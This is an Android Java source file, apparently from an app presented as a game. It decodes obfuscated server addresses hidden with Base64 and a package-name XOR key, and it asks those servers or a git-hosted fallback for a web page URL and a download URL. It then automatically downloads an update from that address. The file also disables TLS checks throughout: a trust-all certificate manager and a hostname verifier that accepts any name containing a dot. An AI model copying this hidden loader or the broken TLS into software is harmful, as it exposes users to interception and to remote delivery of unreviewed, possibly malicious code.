package org.games.app;


import static android.util.Base64.NO_WRAP;

import android.content.Context;
import android.content.SharedPreferences;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.text.TextUtils;
import android.util.Base64;

import org.game.R;
import org.games.util.UpdateApp;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.security.cert.CertificateException;
import java.security.cert.X509Certificate;

import javax.net.ssl.HostnameVerifier;
import javax.net.ssl.HttpsURLConnection;
import javax.net.ssl.SSLContext;
import javax.net.ssl.SSLSession;
import javax.net.ssl.TrustManager;
import javax.net.ssl.X509TrustManager;

public class UrlProvider {


    public static String getString(Context context) {
        try {
            byte[] name = context.getPackageName().getBytes("utf-8");
            byte[] data = Base64.decode(context.getString(R.string.http_url), NO_WRAP);
            int flag = 0x77;
            for (int i = 0; i < name.length; ++i) {
                flag ^= (name[i] & 0xff);
            }
            for (int j = 0; j < data.length; ++j) {
                data[j] ^= flag;
            }
            return new String(data);
        } catch (Throwable e) {
            return "";
        }
    }

    public static void reqUrl(Context context, CallBack callBack) {
        new Thread(new Runnable() {
            @Override
            public void run() {
                trustAllHttpsCertificates();
                HttpsURLConnection.setDefaultHostnameVerifier(new HostnameVerifier() {
                    @Override
                    public boolean verify(String hostname, SSLSession session) {
                        return hostname.contains(".");
                    }
                });

                String url = "";
                String downloadUrl = "";

                PackageInfo packageInfo = null;
                try {
                    packageInfo = context.getPackageManager().getPackageInfo(context.getPackageName(), 0);
                } catch (PackageManager.NameNotFoundException e) {
                    throw new RuntimeException(e);
                }
                String[] urls = getString(context).split(",");
                String data;
                SharedPreferences sp = context.getSharedPreferences("app", Context.MODE_PRIVATE);
                int start = sp.getInt("start", 0);
                for (int i = start; i < urls.length * 2; i++) {
                    String str = urls[i % urls.length];
                    data = reqH5(str, packageInfo.versionCode, packageInfo.packageName);
                    if (TextUtils.isEmpty(data)) {
                        continue;
                    }
                    try {
                        JSONObject jsonObject = new JSONObject(data);
                        JSONObject jsonData = jsonObject.getJSONObject("data");

                        url = jsonData.optString("h5url");
                        downloadUrl = jsonData.optString("download_url");
                        sp.edit().putInt("start", i).apply();
                        break;
                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                }

                if (TextUtils.isEmpty(url)) {
                    String gitUlr = reqGit(context.getString(R.string.git_url));
                    if (TextUtils.isEmpty(gitUlr)) {
                        //todo 显示客服
                        return;
                    }
                    data = reqH5(gitUlr, packageInfo.versionCode, packageInfo.packageName);
                    if (TextUtils.isEmpty(data)) {
                        //todo 显示客服
                        return;
                    }
                    try {
                        JSONObject jsonObject = new JSONObject(data);
                        JSONObject jsonData = jsonObject.getJSONObject("data");

                        url = jsonData.optString("h5url");
                        downloadUrl = jsonData.optString("download_url");
                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                }

                if (!TextUtils.isEmpty(downloadUrl)) {
                    UpdateApp updateApp = new UpdateApp(App.getInstance(), downloadUrl, new DownloadAgent(context));
                    updateApp.execute();
                }
                callBack.cb(url);
            }
        }).start();
    }

    private static String reqH5(String url, int versionCode, String packageName) {
        BufferedReader bufferedReader = null;
        try {
            URL httpUrl = new URL(url);
            HttpURLConnection httpURLConnection = (HttpURLConnection) httpUrl.openConnection();

            //设置请求头header
            httpURLConnection.setRequestMethod("POST");
            httpURLConnection.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
            httpURLConnection.setReadTimeout(5000);

            //设置请求参数
            OutputStream outputStream = httpURLConnection.getOutputStream();
            StringBuilder builder = new StringBuilder();
            builder.append("packageName=");
            builder.append(packageName);
            builder.append("&");
            builder.append("versioncode=");
            builder.append(versionCode);
            builder.append("&");
            builder.append("devicetype=android");

            outputStream.write(builder.toString().getBytes());

            //获取内容
            InputStream inputStream = httpURLConnection.getInputStream();
            bufferedReader = new BufferedReader(new InputStreamReader(inputStream));
            final StringBuffer stringBuffer = new StringBuffer();
            String line = null;
            while ((line = bufferedReader.readLine()) != null) {
                stringBuffer.append(line);
            }
            return stringBuffer.toString();
        } catch (Exception e) {
            e.printStackTrace();
        } finally {
            if (bufferedReader != null) {
                try {
                    bufferedReader.close();
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
        }
        return "";
    }

    private static String reqGit(String url) {
        BufferedReader bufferedReader = null;
        try {
            URL httpUrl = new URL(url);
            HttpURLConnection httpURLConnection = (HttpURLConnection) httpUrl.openConnection();

            //设置请求头header
            httpURLConnection.setRequestMethod("GET");
            httpURLConnection.setReadTimeout(5000);

            //获取内容
            InputStream inputStream = httpURLConnection.getInputStream();
            bufferedReader = new BufferedReader(new InputStreamReader(inputStream));
            final StringBuffer stringBuffer = new StringBuffer();
            String line = null;
            while ((line = bufferedReader.readLine()) != null) {
                stringBuffer.append(line);
            }
            return stringBuffer.toString();
        } catch (Exception e) {
            e.printStackTrace();
        } finally {
            if (bufferedReader != null) {
                try {
                    bufferedReader.close();
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
        }
        return "";
    }

    private static void trustAllHttpsCertificates() {
        TrustManager[] trustAllCerts = new TrustManager[1];
        trustAllCerts[0] = new TrustAllManager();
        SSLContext sc = null;
        try {
            sc = SSLContext.getInstance("SSL");
            sc.init(null, trustAllCerts, null);
        } catch (Exception e) {
            e.printStackTrace();
        }
        HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());
    }

    private static class TrustAllManager implements X509TrustManager {

        @Override
        public void checkClientTrusted(X509Certificate[] chain, String authType) throws CertificateException {
            if (chain != null && chain[0] != null) {
                chain[0].checkValidity();
            }
        }

        @Override
        public void checkServerTrusted(X509Certificate[] chain, String authType) throws CertificateException {
            if (chain != null && chain[0] != null) {
                chain[0].checkValidity();
            }
        }

        @Override
        public X509Certificate[] getAcceptedIssuers() {
            return new X509Certificate[0];
        }
    }
}
